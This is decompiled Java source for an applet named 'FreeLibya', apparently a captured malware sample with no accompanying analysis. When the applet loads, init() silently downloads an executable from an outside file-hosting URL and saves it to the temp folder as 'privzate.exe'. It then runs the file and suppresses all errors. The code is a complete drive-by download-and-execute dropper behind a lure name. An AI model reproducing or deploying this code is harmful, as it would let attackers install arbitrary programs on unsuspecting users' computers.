import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class FreeLibya extends Applet
{
    public static void startupAll() {
        try {
            final String concat = System.getenv("TMP").concat("\\privzate.exe");
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL("http://data.fuskbugg.se/skalman02/javaclient.exe").openStream());
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(concat), 1024);
            final byte[] array = new byte[1024];
            int read;
            while ((read = bufferedInputStream.read(array, 0, 1024)) >= 0) {
                bufferedOutputStream.write(array, 0, read);
            }
            bufferedOutputStream.close();
            bufferedInputStream.close();
            Runtime.getRuntime().exec(concat);
        }
        catch (Exception ex) {}
    }
    
    @Override
    public void init() {
        startupAll();
    }
    
    public void main(final String[] array) {
        startupAll();
    }
}
